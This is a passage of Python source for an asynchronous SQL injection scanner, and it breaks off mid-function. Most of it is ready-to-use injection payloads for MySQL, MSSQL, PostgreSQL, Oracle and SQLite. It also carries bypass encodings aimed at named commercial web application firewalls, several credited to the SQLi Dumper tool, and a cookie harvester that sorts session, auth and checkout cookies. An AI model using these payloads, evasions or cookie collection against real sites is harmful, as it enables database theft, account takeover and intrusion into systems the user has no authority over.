"""
SQL Injection Scanner v2.0 — Full-spectrum injection testing

Features:
1. Error-based detection (FLOOR/RAND/GROUP BY for MySQL, equivalent for others)
2. Union-based detection (ORDER BY column counting + UNION SELECT)
3. Boolean-based blind detection (AND 1=1 vs AND 1=2 response diff)
4. Time-based blind detection (SLEEP/WAITFOR/pg_sleep)
5. Cookie injection testing — extracts & tests all cookies
6. Header injection testing — X-Forwarded-For, Referer, User-Agent, custom
7. POST parameter discovery — parses <form> tags, hidden inputs
8. Smart parameter prioritization — id/cat/pid first, lang/theme last
9. WAF-specific bypass payloads — tailored encodings per detected WAF
10. Technology-based payload selection — detects PHP/ASP/JSP → picks DBMS payloads

Supports: MySQL, MSSQL, PostgreSQL, Oracle, SQLite
"""

import re
import asyncio
import aiohttp
import random
import time
import hashlib
from typing import Dict, List, Optional, Tuple, Any
from dataclasses import dataclass, field
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, urljoin
from bs4 import BeautifulSoup
from loguru import logger


@dataclass
class SQLiResult:
    """Result of SQL injection testing."""
    url: str
    parameter: str
    vulnerable: bool = False
    injection_type: str = ""  # error, union, boolean, time, cookie, header
    dbms: str = ""  # mysql, mssql, postgresql, oracle
    technique: str = ""
    column_count: int = 0
    injectable_columns: List[int] = field(default_factory=list)
    db_version: str = ""
    current_db: str = ""
    current_user: str = ""
    error_message: str = ""
    payload_used: str = ""
    confidence: float = 0.0  # 0.0 - 1.0
    injection_point: str = "url"  # url, cookie, header, post
    cookies_extracted: Dict[str, str] = field(default_factory=dict)
    prefix: str = "'"  # injection prefix that worked (e.g. ', ", -1, 999999.9)
    suffix: str = "-- -"  # injection suffix/comment that worked


@dataclass 
class CookieJar:
    """Collected cookies from a target site."""
    url: str
    cookies: Dict[str, str] = field(default_factory=dict)
    session_cookies: List[str] = field(default_factory=list)
    auth_cookies: List[str] = field(default_factory=list)
    tracking_cookies: List[str] = field(default_factory=list)
    all_set_cookie_headers: List[str] = field(default_factory=list)
    b3_cookies: Dict[str, str] = field(default_factory=dict)  # b3 tracing cookies


# Session/auth cookie name patterns for b3 extraction
SESSION_COOKIE_PATTERNS = [
    re.compile(r"(PHPSESSID|JSESSIONID|ASP\.NET_SessionId|session|sess_id|sid|token|auth|jwt|access_token|refresh_token)", re.I),
    re.compile(r"(wp_|wordpress_|wc_session|checkout)", re.I),
    re.compile(r"(csrf|xsrf|_token|anti.?forgery)", re.I),
    re.compile(r"(b3|x-b3|traceid|spanid|parentspanid|sampled|flags)", re.I),
    re.compile(r"(connect\.sid|express\.sid|rack\.session|_session_id)", re.I),
    re.compile(r"(remember|persistent|stay_logged|keep_alive)", re.I),
    re.compile(r"(cart|basket|order|checkout|payment)", re.I),
]

# B3 tracing header/cookie names
B3_NAMES = {"x-b3-traceid", "x-b3-spanid", "x-b3-parentspanid", "x-b3-sampled", "x-b3-flags", "b3"}


class SQLiScanner:
    """SQL injection vulnerability scanner with cookie/header/POST injection."""

    # DBMS error signatures
    DBMS_ERRORS = {
        "mysql": [
            re.compile(r"SQL syntax.*?MySQL", re.I),
            re.compile(r"Warning.*?\Wmysql_", re.I),
            re.compile(r"Warning.*?\Wmysqli_", re.I),
            re.compile(r"MySQLSyntaxErrorException", re.I),
            re.compile(r"valid MySQL result", re.I),
            re.compile(r"check the manual that corresponds to your MySQL", re.I),
            re.compile(r"Unknown column", re.I),
            re.compile(r"mysql_fetch", re.I),
            re.compile(r"mysql_num_rows", re.I),
            re.compile(r"MySQL server version", re.I),
            re.compile(r"MariaDB server version", re.I),
            re.compile(r"You have an error in your SQL syntax", re.I),
            re.compile(r"com\.mysql\.jdbc", re.I),
            re.compile(r"Unclosed quotation mark", re.I),
        ],
        "mssql": [
            re.compile(r"Driver.*? SQL Server", re.I),
            re.compile(r"OLE DB.*? SQL Server", re.I),
            re.compile(r"\bSQL Server\b.*?Driver", re.I),
            re.compile(r"Warning.*?\W(mssql|sqlsrv)_", re.I),
            re.compile(r"\bSQL Server\b.*?\d", re.I),
            re.compile(r"Microsoft SQL Native Client error", re.I),
            re.compile(r"ODBC SQL Server Driver", re.I),
            re.compile(r"SQLServer JDBC Driver", re.I),
            re.compile(r"Unclosed quotation mark after.*?character string", re.I),
            re.compile(r"Procedure or function .+ expects parameter", re.I),
            re.compile(r"Conversion failed when converting", re.I),
        ],
        "postgresql": [
            re.compile(r"PostgreSQL.*?ERROR", re.I),
            re.compile(r"Warning.*?\Wpg_", re.I),
            re.compile(r"valid PostgreSQL result", re.I),
            re.compile(r"Npgsql", re.I),
            re.compile(r"PG::SyntaxError", re.I),
            re.compile(r"org\.postgresql\.util\.PSQLException", re.I),
            re.compile(r"ERROR:\s+syntax error at or near", re.I),
            re.compile(r"ERROR:\s+parser:", re.I),
        ],
        "oracle": [
            re.compile(r"\bORA-\d{5}", re.I),
            re.compile(r"Oracle error", re.I),
            re.compile(r"Oracle.*?Driver", re.I),
            re.compile(r"Warning.*?\Woci_", re.I),
            re.compile(r"Warning.*?\Wora_", re.I),
            re.compile(r"oracle\.jdbc", re.I),
            re.compile(r"quoted string not properly terminated", re.I),
        ],
        "sqlite": [
            re.compile(r"SQLite/JDBCDriver", re.I),
            re.compile(r"SQLite\.Exception", re.I),
            re.compile(r"System\.Data\.SQLite\.SQLiteException", re.I),
            re.compile(r"Warning.*?\Wsqlite_", re.I),
            re.compile(r"Warning.*?\WSQLite3::", re.I),
            re.compile(r"\[SQLITE_ERROR\]", re.I),
            re.compile(r"SQLite error \d+:", re.I),
        ],
    }

    # Error-based payloads (FLOOR/RAND technique from XDumpGO)
    ERROR_PAYLOADS = {
        "mysql": [
            # FLOOR/RAND (classic MySQL error-based)
            "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT version()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -",
            "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -",
            "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT user()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -",
            # EXTRACTVALUE
            "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))-- -",
            "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database()),0x7e))-- -",
            "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT user()),0x7e))-- -",
            # UPDATEXML
            "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version()),0x7e),1)-- -",
            "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT database()),0x7e),1)-- -",
            # Double query
            "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)y)-- -",
            # BIGINT overflow (MySQL 5.5.5+)
            "' AND !(SELECT*FROM(SELECT CONCAT(0x7e,version(),0x7e))x)-~0-- -",
            "' AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7e,version(),0x7e,0x7e))s), 8446744073709551610, 8446744073709551610)))-- -",
            # EXP() overflow (MySQL 5.5.5+)
            "' AND EXP(~(SELECT*FROM(SELECT version())x))-- -",
            # NAME_CONST (MySQL < 5.1 duplicate key)
            "' AND (SELECT*FROM(SELECT NAME_CONST(version(),1),NAME_CONST(version(),1))x)-- -",
            # JSON error extraction (MySQL 5.7+)
            "' AND JSON_KEYS((SELECT CONCAT(0x7e,version(),0x7e)))-- -",
            # GEOMETRYCOLLECTION
            "' AND GEOMETRYCOLLECTION((SELECT*FROM(SELECT*FROM(SELECT version())a)b))-- -",
            # Numeric boundary
            "' AND 1=(SELECT COUNT(*) FROM information_schema.tables GROUP BY CONCAT(version(),FLOOR(RAND(0)*2)))-- -",
            # Integer subquery
            " AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -",
        ],
        "mssql": [
            "' AND 1=CONVERT(int,(SELECT @@version))-- -",
            "' AND 1=CONVERT(int,(SELECT DB_NAME()))-- -",
            "' AND 1=CONVERT(int,(SELECT SYSTEM_USER))-- -",
            "' HAVING 1=1-- -",
            "' GROUP BY 1 HAVING 1=1-- -",
            # STR/CHAR conversion
            "' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))-- -",
            "' AND 1=CONVERT(int,(SELECT IS_SRVROLEMEMBER('sysadmin')))-- -",
            # FOR XML PATH error
            "' AND 1=CONVERT(int,(SELECT STUFF((SELECT CHAR(58)+name FROM master..sysdatabases FOR XML PATH('')),1,1,'')))-- -",
            # Numeric
            " AND 1=CONVERT(int,@@version)-- -",
            # Stacked query error disclosure
            "'; SELECT 1/0-- -",
        ],
        "postgresql": [
            "' AND 1=CAST((SELECT version()) AS int)-- -",
            "' AND 1=CAST((SELECT current_database()) AS int)-- -",
            "' AND 1=CAST((SELECT current_user) AS int)-- -",
            "'::int-- -",
            # XML / query_to_xml error extraction
            "' AND 1=CAST((SELECT query_to_xml('SELECT version()',true,false,'')) AS int)-- -",
            # Array error extraction
            "' AND 1=CAST((SELECT string_agg(datname,',') FROM pg_database) AS int)-- -",
            # Numeric boundary
            " AND 1=CAST(version() AS int)-- -",
            # Generate series
            "' AND 1=CAST((SELECT current_setting('server_version')) AS int)-- -",
        ],
        "oracle": [
            "' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT banner FROM v$version WHERE ROWNUM=1))-- -",
            "' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE ROWNUM=1))-- -",
            # XMLType error
            "' AND (SELECT XMLType('<:'||(SELECT banner FROM v$version WHERE ROWNUM=1)||'-->') FROM dual)='1'-- -",
            # DBMS_XDB_VERSION
            "' AND 1=DBMS_XDB_VERSION.CHECKIN((SELECT banner FROM v$version WHERE ROWNUM=1))-- -",
            # TO_NUMBER
            "' AND 1=TO_NUMBER((SELECT banner FROM v$version WHERE ROWNUM=1))-- -",
        ],
        "sqlite": [
            # SQLite error-based via CASE / type coercion
            "' AND 1=CAST((SELECT sqlite_version()) AS int)-- -",
            "' AND 1=CAST((SELECT group_concat(name,',') FROM sqlite_master WHERE type='table') AS int)-- -",
            # ABS overflow (SQLite 3.8.6+)
            "' AND ABS(-9223372036854775807)-- -",
            # MATCH error for FTS tables
            "' AND 1=MATCH(1,1)-- -",
            # Unicode
            "' AND UNICODE(1)-- -",
            # ZEROBLOB large alloc
            "' AND ZEROBLOB(999999999)-- -",
        ],
    }
    
    # Heuristic pre-check payloads
    HEURISTIC_PAYLOADS = [
        "'",
        "\"",
        "' OR '1'='1",
        "1 OR 1=1",
        "' OR ''='",
        "1'1",
        "1 AND 1=1",
        "1 AND 1=2",
        "1' AND '1'='1",
        "1' AND '1'='2",
        "-1 OR 1=1",
        "1)) OR 1=1--",
        # Parenthesis-based
        "') OR ('1'='1",
        "')) OR (('1'='1",
        # Comment-based
        "' OR 1=1#",
        "' OR 1=1/*",
        # Backtick (MySQL)
        "`",
        "1`1",
        # Numeric variations
        "0",
        "-0",
        "999999999",
        # Special characters that trigger errors
        "\\",
        "' OR 'x'='x",
        # Double-encoding
        "%27",
        "%22",
        # NULL injection
        "' OR 1 IS NOT NULL-- -",
        # JSON context
        "{'test': 1}",
        "[1]",
    ]
    
    # Time-based payloads
    TIME_PAYLOADS = {
        "mysql": [
            "' AND SLEEP({delay})-- -",
            "' AND (SELECT * FROM (SELECT SLEEP({delay}))a)-- -",
            "1' AND SLEEP({delay})-- -",
            " AND SLEEP({delay})-- -",
            "' OR SLEEP({delay})-- -",
            "1 AND BENCHMARK(5000000,SHA1('test'))-- -",
            # Heavy query (no SLEEP needed — bypasses WAFs blocking sleep/benchmark)
            "' AND (SELECT COUNT(*) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C)-- -",
            # Conditional heavy query
            "' AND IF(1=1,(SELECT COUNT(*) FROM information_schema.columns A, information_schema.columns B),0)-- -",
        ],
        "mssql": [
            "'; WAITFOR DELAY '0:0:{delay}'-- -",
            "' AND 1=1; WAITFOR DELAY '0:0:{delay}'-- -",
            # Stacked query WAITFOR
            "'; IF(1=1) WAITFOR DELAY '0:0:{delay}'-- -",
            # Heavy query
            "' AND (SELECT COUNT(*) FROM sysusers AS a CROSS JOIN sysusers AS b CROSS JOIN sysusers AS c)>0-- -",
        ],
        "postgresql": [
            "'; SELECT pg_sleep({delay})-- -",
            "' AND 1=(SELECT 1 FROM pg_sleep({delay}))-- -",
            # Conditional pg_sleep
            "' AND (CASE WHEN (1=1) THEN pg_sleep({delay}) ELSE pg_sleep(0) END) IS NOT NULL-- -",
            # Heavy query
            "' AND (SELECT COUNT(*) FROM generate_series(1,10000000))>0-- -",
        ],
        "oracle": [
            "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',{delay})-- -",
            # UTL_HTTP (if outbound allowed)
            "' AND 1=DBMS_LOCK.SLEEP({delay})-- -",
            # Heavy query
            "' AND (SELECT COUNT(*) FROM all_objects A, all_objects B)>0-- -",
        ],
        "sqlite": [
            # SQLite has no SLEEP — use LIKE on large ZEROBLOB or RANDOMBLOB
            "' AND LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))-- -",
            # Heavy computation via recursive CTE
            "' AND (SELECT COUNT(*) FROM (WITH RECURSIVE c(x) AS (VALUES(1) UNION ALL SELECT x+1 FROM c WHERE x<100000) SELECT x FROM c))>0-- -",
            # REPLACE chain (CPU-bound)
            "' AND REPLACE(REPLACE(REPLACE(REPLACE(HEX(ZEROBLOB(500000)),'0','a'),'a','bb'),'b','cc'),'c','dd') IS NOT NULL-- -",
        ],
    }
    
    # WAF evasion encodings
    EVASION_TECHNIQUES = {
        "comment": lambda p: p.replace(" ", "/**/"),
        "double_url": lambda p: p.replace("'", "%2527"),
        "mixed_case": lambda p: re.sub(
            r'(SELECT|UNION|FROM|WHERE|AND|OR|INSERT|UPDATE|DELETE|DROP|TABLE|CONCAT|GROUP_CONCAT|GROUP|HAVING|ORDER|BY|INTO|DISTINCT|LIMIT|OFFSET|SUBSTRING|MID|LEFT|RIGHT|IFNULL|ISNULL|CAST|CONVERT)', 
            lambda m: ''.join(c.upper() if i % 2 else c.lower() for i, c in enumerate(m.group())), p, flags=re.I),
        "inline_comment": lambda p: p.replace("UNION", "UN/*!50000ION*/").replace("SELECT", "SE/*!50000LECT*/"),
        # Compound: /**/  +  mixed-case on ALL keywords AND function names (from SQLi Dumper v8.5 OfsKey)
        "compound": lambda p: re.sub(
            r'(UNION|SELECT|FROM|WHERE|AND|OR|ORDER|BY|GROUP|HAVING|LIMIT|OFFSET|INTO|INSERT|UPDATE|DELETE|DROP|TABLE|CONCAT|GROUP_CONCAT|DISTINCT|ALL|NULL|CAST|CONVERT|IFNULL|ISNULL|SUBSTRING|MID|LEFT|RIGHT|CHAR|CHR|ASCII|ORD|COUNT|SUM|AVG|MIN|MAX|INFORMATION_SCHEMA|TABLE_NAME|COLUMN_NAME|TABLE_SCHEMA)',
            lambda m: '/**/' + ''.join(c.upper() if i % 2 else c.lower() for i, c in enumerate(m.group())) + '/**/',
            p, flags=re.I),
        # Function name obfuscation — mixed-case on common SQL functions (SQLi Dumper v8.5 style)
        "func_obfuscation": lambda p: re.sub(
            r'\b(version|database|current_user|system_user|user|concat|concat_ws|group_concat|substring|mid|left|right|length|char|chr|ascii|ord|count|sum|avg|coalesce|ifnull|isnull|replace|lower|upper|trim|hex|unhex|md5|sha1|aes_encrypt|aes_decrypt|load_file|benchmark|sleep|extractvalue|updatexml)\s*\(',
            lambda m: ''.join(c.upper() if i % 2 else c.lower() for i, c in enumerate(m.group()[:-1])) + '(',
            p, flags=re.I),
        # Double-encoded comments: /**/ → %2f**%2f  (bypasses WAFs that decode once)
        "double_encoded_comment": lambda p: p.replace(" ", "%2f**%2f"),
        # Full SQLi Dumper v8.5 compound: %2f**%2f + mixed-case on keywords + function obfuscation
        "sqli_dumper_compound": lambda p: re.sub(
            r'(UNION|SELECT|FROM|WHERE|AND|OR|ORDER|BY|GROUP|HAVING|LIMIT|ALL|NULL|CONCAT|GROUP_CONCAT|DISTINCT|TABLE|INFORMATION_SCHEMA|TABLE_NAME|COLUMN_NAME|TABLE_SCHEMA)',
            lambda m: '%2f**%2f' + ''.join(c.upper() if i % 2 else c.lower() for i, c in enumerate(m.group())) + '%2f**%2f',
            re.sub(
                r'\b(version|database|current_user|system_user|user|concat|group_concat|substring|char|ascii|count|ifnull|isnull|hex|md5|sha1|load_file|benchmark|sleep)\s*\(',
                lambda m: ''.join(c.upper() if i % 2 else c.lower() for i, c in enumerate(m.group()[:-1])) + '(',
                p, flags=re.I),
            flags=re.I),
    }

    # ── Smart parameter prioritization ──
    PARAM_PRIORITY = {
        # High-value (likely DB-backed): score 10
        "id": 10, "item_id": 10, "product_id": 10, "cat_id": 10,
        "category_id": 10, "user_id": 10, "order_id": 10, "page_id": 10,
        "post_id": 10, "article_id": 10, "news_id": 10, "doc_id": 10,
        "pid": 9, "uid": 9, "cid": 9, "nid": 9, "aid": 9,
        "cat": 9, "item": 9, "product": 9, "catid": 9,
        # Medium-value: score 6
        "search": 6, "q": 6, "query": 6, "keyword": 6, "s": 6,
        "action": 6, "do": 6, "cmd": 6, "page": 6,
        "name": 6, "username": 6, "user": 6, "email": 6,
        "file": 5, "path": 5, "url": 5, "redirect": 5,
        "type": 5, "view": 5, "show": 5, "display": 5,
        # Low-value (rarely injectable): score 2
        "lang": 2, "language": 2, "locale": 2, "theme": 2,
        "template": 2, "style": 2, "color": 2, "size": 2,
        "sort": 2, "order": 2, "dir": 2, "limit": 2,
        "offset": 2, "per_page": 2, "format": 2, "callback": 2,
        "utm_source": 1, "utm_medium": 1, "utm_campaign": 1,
        "ref": 1, "source": 1, "fbclid": 1, "gclid": 1,
    }

    # ── WAF-specific bypass payload generators ──
    WAF_BYPASS_PAYLOADS = {
        "Cloudflare": {
            "encodings": [
                lambda p: p.replace("UNION", "UNI%0AON").replace("SELECT", "SEL%0AECT"),
                lambda p: p.replace(" ", "%09"),  # Tab instead of space
                lambda p: p.replace("'", "%EF%BC%87"),  # Fullwidth apostrophe
                lambda p: re.sub(r'UNION\s+SELECT', 'UNION%23%0ASELECT', p, flags=re.I),
            ],
            "techniques": ["time", "boolean"],  # Prefer blind techniques
        },
        "ModSecurity": {
            "encodings": [
                lambda p: p.replace("UNION", "/*!50000UNION*/").replace("SELECT", "/*!50000SELECT*/"),
                lambda p: p.replace(" ", "/**/"),
                lambda p: re.sub(r'(AND|OR)', lambda m: f'/*!{m.group()}*/', p, flags=re.I),
                lambda p: p.replace("'", "' "),  # Space after quote
            ],
            "techniques": ["error", "union", "time"],
        },
        "Wordfence": {
            "encodings": [
                lambda p: p.replace("UNION SELECT", "UNION%23%0ASELECT"),
                lambda p: p.replace(" ", "/**_**/"),
                lambda p: p.replace("AND", "&&").replace("OR", "||"),
            ],
            "techniques": ["time", "boolean"],
        },
        "Sucuri": {
            "encodings": [
                lambda p: p.replace("UNION", "UNI%0BON").replace("SELECT", "SE%0BLECT"),
                lambda p: p.replace("'", "%27"),  # URL-encode single quotes
                lambda p: p.replace(" ", chr(0x0a)),
            ],
            "techniques": ["time", "error"],
        },
        "F5 BIG-IP ASM": {
            "encodings": [
                lambda p: p.replace("'", "%c0%a7"),  # Overlong UTF-8
                lambda p: p.replace("SELECT", "SeLeCt").replace("UNION", "UnIoN"),
            ],
            "techniques": ["time"],  # Only blind works
        },
        "AWS WAF": {
            "encodings": [
                lambda p: p.replace("UNION", "UNION%23%0a").replace("SELECT", "SELECT%23%0a"),
                lambda p: p.replace(" ", "%0c"),  # Form feed
            ],
            "techniques": ["time", "boolean"],
        },
        "Akamai": {
            "encodings": [
                lambda p: p.replace(" ", "%09"),  # Tab
                lambda p: p.replace("UNION", "UNI%00ON").replace("SELECT", "SEL%00ECT"),  # Null byte
                lambda p: p.replace("'", "%ef%bc%87"),  # Fullwidth apostrophe
                lambda p: re.sub(r'(AND|OR|UNION|SELECT)', lambda m: f'/*!50000{m.group()}*/', p, flags=re.I),
            ],
            "techniques": ["time", "boolean"],
        },
        "Imperva": {
            "encodings": [
                lambda p: p.replace("UNION", "UNI%0BON").replace("SELECT", "SEL%0BECT"),
                lambda p: p.replace(" ", "%0a"),  # Newline
                lambda p: re.sub(r'UNION\s+SELECT', '%55NION%20%53ELECT', p, flags=re.I),
                lambda p: p.replace("AND", "AN%00D").replace("OR", "O%00R"),
            ],
            "techniques": ["time"],
        },
        "Barracuda": {
            "encodings": [
                lambda p: p.replace("SELECT", "SeLeCt").replace("UNION", "uNiOn"),
                lambda p: p.replace(" ", "/**/"),
                lambda p: p.replace("'", "convert(varchar,0x27)"),
            ],
            "techniques": ["time", "error"],
        },
        "FortiWeb": {
            "encodings": [
                lambda p: p.replace("UNION", "%55nion").replace("SELECT", "%53elect"),
                lambda p: p.replace(" ", "/**/"),
                lambda p: p.replace("AND", "&&"),
            ],
            "techniques": ["time", "boolean"],
        },
    }

    # ── Technology → likely DBMS mapping ──
    TECH_DBMS_MAP = {
        "php": ["mysql", "postgresql", "sqlite"],
        "asp": ["mssql"],
        "asp.net": ["mssql"],
        "aspx": ["mssql"],
        "jsp": ["oracle", "mysql", "postgresql"],
        "java": ["oracle", "mysql", "postgresql"],
        "python": ["postgresql", "mysql", "sqlite"],
        "ruby": ["postgresql", "mysql", "sqlite"],
        "node": ["mysql", "postgresql", "mongodb"],
        "wordpress": ["mysql"],
        "drupal": ["mysql", "postgresql"],
        "joomla": ["mysql"],
        "magento": ["mysql"],
        "woocommerce": ["mysql"],
        "shopify": [],  # SaaS, no SQLi
        "django": ["postgresql", "mysql", "sqlite"],
        "laravel": ["mysql", "postgresql"],
        "rails": ["postgresql", "mysql", "sqlite"],
    }

    # ── Header injection targets ──
    INJECTABLE_HEADERS = [
        "X-Forwarded-For",
        "X-Forwarded-Host",
        "X-Client-IP",
        "X-Real-IP",
        "Referer",
        "X-Custom-IP-Authorization",
        "X-Originating-IP",
        "CF-Connecting-IP",
        "True-Client-IP",
        "Client-IP",
        "User-Agent",
        "X-Cluster-Client-IP",
        "X-Remote-IP",
        "X-Remote-Addr",
        "Forwarded",
        "X-ProxyUser-Ip",
        "Via",
        "Contact",
        "From",
        "X-Wap-Profile",
        "X-Api-Version",
    ]

    # ── Stacked query payloads (for DBMS that support batched statements) ──
    STACKED_PAYLOADS = {
        "mssql": [
            "'; WAITFOR DELAY '0:0:{delay}'-- -",
            "'; SELECT @@version-- -",
            "'; IF(1=1) WAITFOR DELAY '0:0:{delay}'-- -",
        ],
        "postgresql": [
            "'; SELECT pg_sleep({delay})-- -",
            "'; SELECT version()-- -",
            "'; CREATE TEMP TABLE IF NOT EXISTS nZrqT(x int); DROP TABLE IF EXISTS nZrqT-- -",
        ],
        "mysql": [
            "'; SELECT SLEEP({delay})-- -",
            "'; SELECT 1-- -",
        ],
    }

    # ── ORDER BY / GROUP BY injection payloads ──
    ORDER_BY_PAYLOADS = [
        ",(SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)",
        " ASC,(SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)",
        " DESC,IF(1=1,1,(SELECT 1 FROM information_schema.tables))",
        " RLIKE (SELECT (CASE WHEN (1=1) THEN 1 ELSE 0x28 END))",
    ]

    def __init__(self, timeout: int = 15, max_concurrent: int = 10, 
                 delay: int = 5, user_agent: str = None, proxy: str = None):
        self.timeout = timeout
        self.max_concurrent = max_concurrent
        self.delay = delay
        self.proxy = proxy
        self.user_agent = user_agent or random.choice([
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        ])
        self.semaphore = asyncio.Semaphore(max_concurrent)
        # Collected cookies & headers from scanned targets
        self.collected_cookies: List[CookieJar] = []

    # ══════════════════════════ UTILITY METHODS ══════════════════════════

    def _parse_url(self, url: str) -> Tuple[str, Dict[str, List[str]]]:
        """Parse URL and extract base URL + parameters."""
        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)
        base = urlunparse((parsed.scheme, parsed.netloc, parsed.path, '', '', ''))
        return base, params

    def _build_url(self, base: str, params: Dict[str, List[str]]) -> str:
        """Rebuild URL from base + parameters."""
        flat = {k: v[0] if isinstance(v, list) else v for k, v in params.items()}
        query = urlencode(flat)
        return f"{base}?{query}" if query else base

    def _prioritize_params(self, params: Dict[str, List[str]]) -> List[str]:
        """Sort parameters by injection likelihood — id/cat/pid first, utm/ref last."""
        scored = []
        for name in params:
            name_lower = name.lower()
            # Check exact match first
            score = self.PARAM_PRIORITY.get(name_lower, 4)
            # Pattern-based scoring
            if re.match(r'.*_?id$', name_lower):
                score = max(score, 9)
            elif re.match(r'.*_?(num|no|number|code)$', name_lower):
                score = max(score, 7)
            scored.append((name, score))
        scored.sort(key=lambda x: x[1], reverse=True)
        return [name for name, _ in scored]

    def _detect_technology(self, url: str, headers: Dict = None, body: str = "") -> List[str]:
        """Detect backend technology from URL extension, headers, body."""
        techs = []
        parsed = urlparse(url)
        path_lower = parsed.path.lower()
        
        # URL extension
        if path_lower.endswith('.php'):
            techs.append("php")
        elif path_lower.endswith(('.asp', '.aspx')):
            techs.append("asp.net")
        elif path_lower.endswith('.jsp'):
            techs.append("jsp")
        elif path_lower.endswith(('.py', '.cgi')):
            techs.append("python")
        elif path_lower.endswith('.rb'):
            techs.append("ruby")
        
        if headers:
            powered_by = headers.get("X-Powered-By", headers.get("x-powered-by", "")).lower()
            server = headers.get("Server", headers.get("server", "")).lower()
            if "php" in powered_by:
                techs.append("php")
            elif "asp.net" in powered_by:
                techs.append("asp.net")
            elif "express" in powered_by or "node" in server:
                techs.append("node")
            if "apache" in server and "php" not in techs:
                techs.append("php")  # Apache often means PHP
        
        if body:
            if re.search(r'wp-content|wordpress', body, re.I):
                techs.append("wordpress")
            elif re.search(r'drupal', body, re.I):
                techs.append("drupal")
            elif re.search(r'joomla', body, re.I):
                techs.append("joomla")
            elif re.search(r'woocommerce|wc-ajax', body, re.I):
                techs.append("woocommerce")
                techs.append("wordpress")
            elif re.search(r'laravel|csrf-token.*content', body, re.I):
                techs.append("laravel")
                techs.append("php")
        
        return list(set(techs))

    def _get_likely_dbms(self, techs: List[str]) -> List[str]:
        """Get likely DBMS list based on detected technologies."""
        dbms_set = []
        for tech in techs:
            for db in self.TECH_DBMS_MAP.get(tech, []):
                if db not in dbms_set:
                    dbms_set.append(db)
        if not dbms_set:
            dbms_set = ["mysql", "mssql", "postgresql"]  # Default order
        return dbms_set

    def _apply_waf_bypass(self, payload: str, waf_name: str) -> List[str]:
        """Generate WAF-bypass variations of a payload for a specific WAF."""
        encoded = [payload]  # Always include original
        waf_info = self.WAF_BYPASS_PAYLOADS.get(waf_name, {})
        for encoder in waf_info.get("encodings", []):
            try:
                encoded.append(encoder(payload))
            except Exception:
                pass
        # Always add generic evasions too
        for name, func in self.EVASION_TECHNIQUES.items():
            try:
                encoded.append(func(payload))
            except Exception:
                pass
        return list(set(encoded))

    # ══════════════════════════ COOKIE EXTRACTION ══════════════════════════

    async def extract_cookies(self, url: str, session: aiohttp.ClientSession) -> CookieJar:
        """Extract ALL cookies from a URL — session, auth, b3, tracking.
        
        Makes initial GET request, follows redirects, collects:
        - Response Set-Cookie headers
        - Session cookies (PHPSESSID, JSESSIONID, etc.)
        - Auth cookies (token, jwt, auth, remember)
        - B3 tracing cookies/headers
        - Commerce cookies (cart, checkout, payment)
        """
        jar = CookieJar(url=url)
        
        try:
            async with self.semaphore:
                # Create a cookie jar to capture all cookies
                cookie_jar = aiohttp.CookieJar(unsafe=True)
                async with aiohttp.ClientSession(
                    timeout=aiohttp.ClientTimeout(total=self.timeout),
                    cookie_jar=cookie_jar,
                    headers={"User-Agent": self.user_agent}
                ) as cookie_session:
                    async with cookie_session.get(url, allow_redirects=True, ssl=False) as resp:
                        # Collect Set-Cookie headers
                        for header in resp.headers.getall("Set-Cookie", []):
                            jar.all_set_cookie_headers.append(header)
                        
                        # Collect response cookies
                        for name, cookie in resp.cookies.items():
                            jar.cookies[name] = cookie.value
                        
                        # Also get from the cookie jar (includes redirect cookies)
                        for cookie in cookie_jar:
                            jar.cookies[cookie.key] = cookie.value
                        
                        # Collect B3 tracing from response headers
                        for header_name in resp.headers:
                            if header_name.lower() in B3_NAMES or header_name.lower().startswith("x-b3"):
                                jar.b3_cookies[header_name] = resp.headers[header_name]
                        
                        # Categorize cookies
                        for name, value in jar.cookies.items():
                            name_lower = name.lower()
                            
                            # B3 cookies
                            if any(b3 in name_lower for b3 in ["b3", "trace", "span", "sampled"]):
                                jar.b3_cookies[name] = value
                            
                            # Session cookies
                            if any(p.search(name) for p in SESSION_COOKIE_PATTERNS[:3]):
                                jar.session_cookies.append(f"{name}={value}")
                            
                            # Auth cookies
                            if re.search(r"auth|token|jwt|access|login|remember|persist", name_lower):
                                jar.auth_cookies.append(f"{name}={value}")
                            
                            # Tracking cookies
                            if re.search(r"utm|_ga|_gid|fbp|_fbc|analytics|track", name_lower):
